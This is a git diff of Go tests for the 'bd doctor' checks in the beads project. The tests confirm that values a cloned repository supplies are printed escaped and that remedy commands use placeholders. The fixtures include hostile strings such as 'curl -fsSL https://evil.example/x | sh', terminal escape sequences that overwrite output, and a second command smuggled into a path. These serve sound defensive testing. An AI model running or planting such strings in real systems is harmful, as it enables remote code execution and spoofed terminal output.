@@ -1,10 +1,17 @@
 package doctor
 
 import (
+	"net"
 	"os"
 	"path/filepath"
+	"runtime"
+	"strconv"
 	"strings"
 	"testing"
+	"time"
+	"unicode"
+
+	"github.com/steveyegge/beads/internal/storage/doltutil"
 )
 
 func TestFreshCloneServerResult(t *testing.T) {
@@ -221,6 +228,19 @@ func TestFreshCloneServerUnreachableResult(t *testing.T) {
 		t.Errorf("server-unreachable fix should not suggest 'bd bootstrap'; got: %s", check.Fix)
 	}
 
+	// An IPv6 host, configured bare or bracketed, is named as [host]:port in
+	// both the unreachable and the missing-database message.
+	for _, host := range []string{"::1", "[::1]"} {
+		for name, msg := range map[string]string{
+			"unreachable": freshCloneServerUnreachableResult("acf_beads", host, 3309, nil).Message,
+			"missing db":  freshCloneServerResult(false, "acf_beads", host, 3309, "").Message,
+		} {
+			if !strings.Contains(msg, "[::1]:3309") || strings.Contains(msg, "[[::1]]") || strings.Contains(msg, " ::1:3309") {
+				t.Errorf("%s message for host %q must name the server as [::1]:3309, got: %s", name, host, msg)
+			}
+		}
+	}
+
 	// Nil error path should still produce a usable message and not panic.
 	checkNil := freshCloneServerUnreachableResult("beads", "127.0.0.1", 3307, nil)
 	if checkNil.Status != StatusWarning {
@@ -287,6 +307,146 @@ func TestCheckFreshClone_EmbeddedMode(t *testing.T) {
 
 			if !strings.Contains(check.Message, tt.wantContains) {
 				t.Errorf("expected message to contain %q, got: %s", tt.wantContains, check.Message)
+			}
+		})
+	}
+}
+
+// TestFreshCloneServerResultNamesConfiguredValuesEscaped pins the
+// remedy-printing invariant at the fresh-clone check: the sync.remote and
+// dolt.host a cloned repository's committed config.yaml sets are named escaped
+// beside the bd bootstrap remedy.
+func TestFreshCloneServerResultNamesConfiguredValuesEscaped(t *testing.T) {
+	got := freshCloneServerResult(false, "beads", "db\r\x1b[2K", 3309, "git+https://example.com/r.git\r\x1b[2KRun curl evil.example | sh")
+	if strings.ContainsAny(got.Message, "\r\x1b") {
+		t.Errorf("Message prints a carriage return or terminal escape raw:\n%q", got.Message)
+	}
+	if !strings.Contains(got.Message, `\x1b[2KRun curl`) {
+		t.Errorf("Message does not name sync.remote escaped:\n%q", got.Message)
+	}
+}
+
+// doctorHostileValue is a value a cloned repository can commit in
+// metadata.json (dolt_server_host) or config.yaml (routing.contributor): a
+// carriage return and ESC[2K erase the line bd printed, and text of its own
+// takes its place.
+const doctorHostileValue = "../plan; curl -fsSL https://evil.example/x | sh #\r\x1b[2KError: run curl"
+
+// requireDoctorTextEscaped fails when text holds a character a terminal acts
+// on, other than line breaks and tabs, or does not name doctorHostileValue
+// escaped.
+func requireDoctorTextEscaped(t *testing.T, what, text string) {
+	t.Helper()
+	if strings.ContainsFunc(text, func(r rune) bool { return r != '\n' && r != '\t' && !unicode.IsGraphic(r) }) {
+		t.Errorf("%s prints a control character raw:\n%q", what, text)
+	}
+	if !strings.Contains(text, `\r\x1b[2KError: run curl`) {
+		t.Errorf("%s does not name the value escaped:\n%q", what, text)
+	}
+}
+
+// TestDoctorChecksNameConfiguredValuesEscaped pins the remedy-printing
+// invariant at the bd doctor checks that name a clone-supplied value beside
+// their Fix: the configured Dolt server's address, and a routing repo pasted
+// into the `bd repo add` command, which takes a <path> placeholder for a
+// value no shell passes on unchanged.
+func TestDoctorChecksNameConfiguredValuesEscaped(t *testing.T) {
+	// A real dial of the host returns the error the checks print: Go's net
+	// package repeats the address it could not dial.
+	_, dialErr := net.DialTimeout("tcp", doltutil.ServerAddr(doctorHostileValue, 3309), time.Second)
+	if dialErr == nil || !strings.Contains(dialErr.Error(), "\x1b[2KError") {
+		t.Fatalf("dialing %q returned %v, want an error that repeats the host", doctorHostileValue, dialErr)
+	}
+	t.Run("fresh clone, server unreachable", func(t *testing.T) {
+		got := freshCloneServerUnreachableResult("beads", doctorHostileValue, 3309, dialErr)
+		requireDoctorTextEscaped(t, "Message", got.Message)
+		requireDoctorTextEscaped(t, "Detail", got.Detail)
+	})
+	t.Run("server reachable", func(t *testing.T) {
+		got := checkServerReachable(doctorHostileValue, 1)
+		requireDoctorTextEscaped(t, "Message", got.Message)
+		requireDoctorTextEscaped(t, "Detail", got.Detail)
+	})
+	t.Run("a check's printed form", func(t *testing.T) {
+		check := DoctorCheck{Name: "n" + doctorHostileValue, Message: "m" + doctorHostileValue,
+			Detail: "d: " + dialErr.Error(), Fix: "f" + doctorHostileValue}.Printed()
+		for what, text := range map[string]string{"Name": check.Name, "Message": check.Message, "Detail": check.Detail, "Fix": check.Fix} {
+			requireDoctorTextEscaped(t, what, text)
+		}
+		plain := DoctorCheck{Name: "Dolt", Message: "ok", Detail: "line one\n  line two", Fix: "Run: bd doctor --fix"}
+		if got := plain.Printed(); got != plain {
+			t.Errorf("Printed() changed a check with nothing to escape: %+v", got)
+		}
+	})
+	t.Run("vestigial sync worktree", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("a Windows file name cannot hold a control character")
+		}
+		repo := filepath.Join(t.TempDir(), "my repo"+doctorHostileValue)
+		for _, dir := range []string{".git", ".beads", ".beads-sync"} {
+			if err := os.MkdirAll(filepath.Join(repo, dir), 0o755); err != nil {
+				t.Fatal(err)
+			}
+		}
+		if err := os.WriteFile(filepath.Join(repo, ".beads", "redirect"), []byte("../other/.beads\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		got := CheckNoVestigialSyncWorktrees(repo)
+		requireDoctorTextEscaped(t, "Detail", got.Detail)
+		requireDoctorTextEscaped(t, "Fix", got.Fix)
+		if !strings.HasPrefix(got.Fix, "Remove with: rm -rf <path>  (<path>: ") {
+			t.Errorf("the rm -rf remedy pastes a path no shell passes on unchanged:\n%s", got.Fix)
+		}
+		spaced := filepath.Join(t.TempDir(), "my repo")
+		for _, dir := range []string{".git", ".beads", ".beads-sync"} {
+			if err := os.MkdirAll(filepath.Join(spaced, dir), 0o755); err != nil {
+				t.Fatal(err)
+			}
+		}
+		if err := os.WriteFile(filepath.Join(spaced, ".beads", "redirect"), []byte("../other/.beads\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		if got, want := CheckNoVestigialSyncWorktrees(spaced).Fix, "Remove with: rm -rf '"+filepath.Join(spaced, ".beads-sync")+"'"; got != want {
+			t.Errorf("Fix = %q, want %q: a path with a space goes into rm -rf as one word", got, want)
+		}
+	})
+	t.Run("stale legacy hooks rm", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("the rows spell the POSIX quoting")
+		}
+		// The hooks directory can be one the repository commits
+		// (core.hooksPath), so the file names, like the checkout path, are
+		// the clone's.
+		got := staleFilesRemoveCommand(runtime.GOOS, []string{
+			"/w/My Projects/app/.beads-hooks/pre-commit.legacy",
+			"/w/app/.beads-hooks/a;b.legacy",
+			"/w/app/.beads-hooks/x" + doctorHostileValue,
+		})
+		requireDoctorTextEscaped(t, "Fix", got)
+		want := "rm '/w/My Projects/app/.beads-hooks/pre-commit.legacy' '/w/app/.beads-hooks/a;b.legacy' <file3>  (<file3>: "
+		if !strings.HasPrefix(got, want) {
+			t.Errorf("rm command = %q, want it to start %q: each path goes in as one shell word", got, want)
+		}
+		if got, want := staleFilesRemoveCommand(runtime.GOOS, []string{"/w/app/.git/hooks/pre-commit.legacy"}), "rm /w/app/.git/hooks/pre-commit.legacy"; got != want {
+			t.Errorf("rm command = %q, want %q unchanged", got, want)
+		}
+	})
+	for _, key := range []string{"contributor", "maintainer"} {
+		t.Run("routing."+key+" not hydrated", func(t *testing.T) {
+			tmpDir := t.TempDir()
+			beadsDir := filepath.Join(tmpDir, ".beads")
+			if err := os.MkdirAll(beadsDir, 0o755); err != nil {
+				t.Fatal(err)
+			}
+			config := "routing:\n  mode: auto\n  " + key + ": " + strconv.Quote(doctorHostileValue) +
+				"\nrepos:\n  additional:\n    - ~/other-repo\n"
+			if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(config), 0o644); err != nil {
+				t.Fatal(err)
+			}
+			issues := strings.Join(checkYAMLConfigValues(tmpDir), "\n")
+			requireDoctorTextEscaped(t, "checkYAMLConfigValues", issues)
+			if !strings.Contains(issues, "Run `bd repo add <path>`  (<path>: ") {
+				t.Errorf("the bd repo add remedy pastes a value no shell passes on unchanged:\n%s", issues)
 			}
 		})
 	}
